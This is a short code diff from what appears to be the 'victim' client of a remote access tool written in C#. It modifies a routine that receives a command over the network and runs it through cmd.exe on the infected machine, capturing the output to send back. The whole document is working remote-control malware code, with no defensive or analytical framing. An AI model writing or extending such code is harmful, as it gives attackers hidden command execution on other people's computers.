@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
@@ -84,13 +85,13 @@ namespace LinkUs.Victim
 
         private static object ExecuteBatch(ExecuteRemoteCommandLine executeRemoteCommand)
         {
-            executeRemoteCommand.Arguments.Insert(0, executeRemoteCommand.CommandLine);
             var proc = new System.Diagnostics.Process();
             proc.StartInfo.FileName = "cmd.exe";
-            proc.StartInfo.Arguments = "/c " + string.Join(" ", executeRemoteCommand.Arguments);
+            proc.StartInfo.Arguments = "/c " + executeRemoteCommand.CommandLine + " " + string.Join(" ", executeRemoteCommand.Arguments);
             proc.StartInfo.UseShellExecute = false;
             proc.StartInfo.RedirectStandardOutput = true;
             proc.Start();
+
             var result = proc.StandardOutput.ReadToEnd();
             proc.WaitForExit();
             return result;
